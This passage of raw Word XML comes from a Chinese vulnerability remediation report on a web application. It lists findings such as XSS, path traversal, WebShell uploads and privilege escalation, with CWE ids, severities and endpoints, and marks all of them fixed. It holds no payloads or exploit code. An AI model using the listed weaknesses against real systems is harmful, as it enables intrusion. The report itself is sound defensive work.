            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>6</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>XSS 反射型 — page_content 无过滤渲染</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>跨站脚本</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-79</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>🟡</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>中危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /page</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/page 路由未授权访问</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>认证缺失</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-306</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>🔴</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>紧急</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /page</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>8</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>上传文件名路径穿越</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>文件上传路径遍历</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-22/CWE-434</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>🟠</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>高危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>POST /upload</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>上传文件内容未检测（图片马/WebShell）</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>任意文件上传</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-434</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>🟠</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>高危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>POST /upload</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>10</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>上传文件目录静态文件暴露</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>静态资源公开访问</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-552</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>🟡</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>中危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>static/uploads/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>11</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>原有模块越权与充值漏洞</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>水平越权/金额逻辑</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>CWE-639/CWE-841</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>🟠</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>高危</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/profile</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>/recharge</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1344"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>总计：11 项缺陷</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve">，其中 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>紧急 3 项</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>高危 5 项</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>中危 2 项</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>P0修复1项</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b w:val="0"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>全部已修复并验证通过。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="160"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="1A1A2E"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>二、漏洞详情与修复方案</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="80" w:after="80"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="240" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
          <w:b/>
          <w:color w:val="333333"/>
          <w:sz w:val="26"/>
        </w:rPr>
        <w:t>【漏洞 1】LFI 目录穿越读取任意文件（CWE-22/CWE-98）</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4703"/>
        <w:gridCol w:w="4703"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>条目</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
            <w:shd w:fill="667eea"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>内容</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>漏洞接口</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b w:val="0"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>GET /page?name={path}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>原始风险等级</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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紧急</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Microsoft YaHei" w:hAnsi="Microsoft YaHei" w:eastAsia="Microsoft YaHei"/>
                <w:b/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>当前状态</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>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已修复</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="4703"/>
